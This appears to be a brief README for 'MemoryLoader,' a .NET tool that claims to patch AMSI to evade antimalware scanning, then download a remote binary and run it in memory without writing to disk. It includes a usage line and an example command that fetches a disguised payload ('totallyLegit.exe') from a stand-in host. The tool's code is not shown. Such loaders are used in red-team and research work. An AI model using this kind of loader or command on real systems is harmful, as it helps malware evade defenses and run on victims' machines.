# MemoryLoader

A .NET binary loader that bypasses AMSI checks. It will patch AMSI, download a remote binary, and execute it in memory without the binary ever hitting disk.

Usage:

`./MemoryLoader.exe [URL_TO_PAYLOAD]`

Example:  
`./MemoryLoader.exe http://example.com/totallyLegit.exe`
